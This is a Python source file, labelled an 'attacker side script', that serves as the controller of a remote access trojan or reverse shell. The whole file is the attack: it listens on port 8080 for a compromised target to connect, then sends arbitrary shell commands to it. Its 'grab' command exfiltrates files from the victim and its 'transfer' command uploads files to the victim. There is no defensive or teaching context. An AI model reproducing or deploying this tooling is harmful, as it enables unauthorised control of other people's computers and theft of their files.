
# Attacker.py (Attacker Side Script)

# TCP Connection
import socket

# OS essentials
import os

import time

# Connecting Target To Attacker
def connect():
    # Starting Socket Server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Binding Server
    s.bind((socket.gethostname(), 8080))

    # Lestening To 1 Connection
    s.listen(1)
    
    print ('[Info] Listening for incoming TCP connection on port 8080')
    # Accept Connection
    conn, addr = s.accept()
    
    print ('[+] We got a connection from: ', addr)

    # We Do Not Know The Target's Working Directory
    # So Initially It Is "Shell"
    cwd = 'Shell'

    # Recieve Response From Target
    r = conn.recv(5120).decode('utf-8')

    # If Response Contains "dir:"
    # It Means It Contains Target's Current Working Directory
    if ('dir:' in r):
        # Extract Working Directory
        # Skip 4 Characters
        # Because They Are 'd', 'i', 'r', ':'
        cwd = r[4:]

    while True:
        # Input Command From User
        command = input(str(cwd) + ":> ")

        if 'terminate' in command:
            # Send Command To Target
            conn.send('terminate'.encode('utf-8'))

            # Close Connection
            conn.close()

            # Break Loop
            break


        elif 'grab' in command:
            # Send Command
            conn.send(command.encode('utf-8'))

            # Recieve Filename
            file_name = conn.recv(1024).decode('utf-8')
            print("[+] Grabbing [" + file_name + "]...")

            # Send Response
            conn.send('OK'.encode('utf-8'))
            
            # Recieve Filesize
            file_size = conn.recv(1024).decode('utf-8')
            
            # Send Response
            conn.send('OK'.encode('utf-8'))

            # Print Size Of File In KB
            print("[Info] Total: " + str(int(file_size)/1024) + " KB")

            # Open File For Writing
            with open(file_name, "wb") as file:
                
                # File Will Be Recieved In Small Chunks Of Data
                # Chunks Recieved
                c = 0
                
                # Starting Time
                start_time = time.time()

                # Running Loop Until c < int(file_size)
                while c < int(file_size):

                    # Recieve Bytes
                    data = conn.recv(1024)

                    # Break If No Data
                    if not (data):
                        break

                    # Write Data To File
                    file.write(data)

                    # Chunks Recieved
                    c += len(data)

                # Ending the time capture.
                end_time = time.time()

            # Show Time
            print("[+] File Grabbed. Total time: ", end_time - start_time)

        elif 'transfer' in command:
            conn.send(command.encode('utf-8'))

            # Getting File Details
            file_name = command[9:]
            file_size = os.path.getsize(file_name)

            # Sending Filename
            conn.send(file_name.encode('utf-8'))

            # Recieve And Print Response
            print(conn.recv(1024).decode('utf-8'))

            # Send File Size
            conn.send(str(file_size).encode('utf-8'))
            
            print("Getting Response")
            print(conn.recv(1024).decode('utf-8'))
            
            print("[+] Transferring [" + str(file_size/1024) + "] KB...")

            # Open File For Reading
            with open(file_name, "rb") as file:
                
                # Chunks Sent
                c = 0
                
                # Starting Time
                start_time = time.time()
                
                # Running Loop Until c < int(file_size)
                while c < int(file_size):

                    # Read 1024 Bytes
                    data = file.read(1024)

                    # If No Data? Break The Loop
                    if not (data):
                        break

                    # Send Data To Target
                    conn.sendall(data)

                    # Chunks Added
                    c += len(data)

                # Ending Time
                end_time = time.time()
                
                print("[+] File Transferred. Total time: ", end_time - start_time)

        # Otherwise If Command Is Not Null
        elif (len(command.strip()) > 0):

            # Send Command To Target
            conn.send(command.encode('utf-8'))

            # Read Reply From Target
            r = conn.recv(5120).decode('utf-8')

            # If 'dir:' in Reply? Target Has Sent It's Working Directory
            if ('dir:' in r):

                # Get Working Directory
                cwd = r[4:]
            else:

                # Otherwise Print Reply
                print (r)

# Main
def main ():
    connect()

# Start Of Code
main()
